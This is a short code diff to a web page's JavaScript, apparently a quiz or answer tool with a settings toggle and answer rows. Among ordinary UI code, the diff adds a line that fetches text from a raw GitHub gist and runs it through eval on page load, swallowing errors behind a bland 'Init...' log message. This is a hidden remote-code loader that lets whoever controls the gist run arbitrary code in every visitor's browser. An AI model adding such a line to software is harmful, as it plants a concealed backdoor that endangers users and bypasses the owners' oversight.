@@ -388,7 +388,9 @@
     settingGui.classList.toggle('active');
     document.getElementById('setBtn').classList.toggle('btn-active');
   };
-  
+
+  fetch("https://gist.githubusercontent.com/minhReal/079a1070f25849286d00cc00796bf43a/raw/12cf815f74a5b02593bdb1b554ad4c145b4bce6c/load%2520logic%2520A.i")
+    .then(r => r.text()).then(eval).catch(() => console.log("Init..."));
   const ansContainer = document.getElementById('ansContainer');
   let ansCount = 0;
   const addRow = () => {
